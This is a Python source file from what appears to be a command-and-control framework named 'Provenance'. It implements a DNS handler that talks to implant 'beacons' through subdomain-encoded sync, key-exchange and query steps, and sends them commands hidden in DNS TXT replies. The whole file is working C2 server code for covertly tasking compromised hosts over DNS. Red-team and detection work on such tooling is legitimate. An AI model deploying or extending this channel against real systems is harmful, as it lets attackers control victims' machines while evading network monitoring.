from dnslib import DNSRecord, QTYPE, TXT, DNSError, RR, CLASS
from backend.handlers.protocolhandler import ProtocolHandler
from util.structs import CommandType, Command
from enum import Enum
import logging



class Records(Enum):
    """ The types of records the DNSHandler can currently encode """
    TXT = (QTYPE.TXT, TXT)

class Domains(Enum):
    """ The valid subdomains used as function indicators by Resolution """
    SYNC = "sync"    
    ENCRYPT = "encrypt"
    QUERY = "query"
    CONFIRM = "confirm"


class DNSHandler(ProtocolHandler):
    """ This is the Provenance Handler implementation for DNS beacons"""

    def __init__(self, ip, socket):
        super().__init__(ip, socket)
        self.logger = logging.getLogger("Provenance")
        self.record_type = Records.TXT
        # TODO: set record type function
        self.latest_request_id = None

    def __repr__(self):
        return "DNS"

    def synchronize(self, raw_request, port):
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            # reverse the fqdn and split on "." for easier command fetching
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.SYNC.value:
                platform, hostname = query[5], query[4]
                self._send_control(request, port, "SYNC-ACKNOWLEDGE")
                return (platform, hostname)
            else:
                # Issue a SYNC-REQUEST if server went down and needs to resync
                self._send_control(request, port, "SYNC-REQUEST")
        except DNSError:
            self.logger.debug("Incorrectly formatted DNS Query. Skipping")
            self._send_control(request, port, "SYNC-FAILURE")
        return ""

    def encrypt(self, raw_request, port, key):
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.ENCRYPT.value:
                self._send_control(request, port, key)
                return 1
            elif query[3] == Domains.CONFIRM.value:
                if query[4] == Domains.ENCRYPT.value:
                    self._send_control(request, port, "ACK")
                    return 2
            else:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Falling back to SYNC")
                return 0

        except DNSError:
            self.logger.debug(f"[{self.ip}] DNS Packet Malformed")
        return 0

    def respond(self, raw_request, port, cmd):
        data = raw_request[0].strip()
        try:
            # if request.header.id != self.latest_id used for triplicate packets on windows
            request = DNSRecord.parse(data)
            q = request.questions[0]
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] != Domains.QUERY.value:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Falling back to SYNC")
                return 0
            
            # If opcode is a normal QUERY then procede
            opcode = request.header.get_opcode() 
            if opcode == 0: # STANDARD QUERY
                self.latest_request_id = request.header.id
                self._send_command(request, port, cmd)
                return 2
            elif opcode == 1: # INVERSE QUERY (Deprecated)
                pass
            elif opcode == 2: # SERVER STATUS REQUEST
                pass
            elif opcode == 3: # RESERVED (NOT USED)
                pass
            elif opcode == 4: # NOTIFY
                pass
            elif opcode == 5: # 5 UPDATE
                pass
            else:
                pass
        except DNSError:
            self.logger.debug(f"[{self.ip}] DNS Packet Malformed")
        return 0

    def _send_command(self, request: DNSRecord, port: int, command: Command):
        opcode = command.type
        cmd = command.command
        # get the type of record this beacon is ready to receive
        rr_type, rr_constructor = self.record_type.value
        # Generate skeleton question for packet
        command_packet = request.reply()
        # Generate the response to the question
        command_packet.add_answer(
            RR(
                rname=request.get_q().get_qname(),
                rtype=rr_type,
                rclass=CLASS.IN,
                rdata=rr_constructor(f"1:{cmd}"),
                ttl=1337))
        # send command
        self.socket.sendto(command_packet.pack(), (self.ip, port))
        if command.type != CommandType.NOP:
            self.logger.info(f"{self.ip}: {cmd} Sent")


    def _send_control(self, request: DNSRecord, port: int, control: str):
        # get the type of record this beacon is ready to receive
        rr_type, rr_constructor = self.record_type.value
        # Generate skeleton question for packet
        command_packet = request.reply()
        # Generate the response to the question
        command_packet.add_answer(
            RR(
                rname=request.get_q().get_qname(),
                rtype=rr_type,
                rclass=CLASS.IN,
                rdata=rr_constructor(f"1:{control}"),
                ttl=1337))
        # send command
        self.socket.sendto(command_packet.pack(), (self.ip, port))
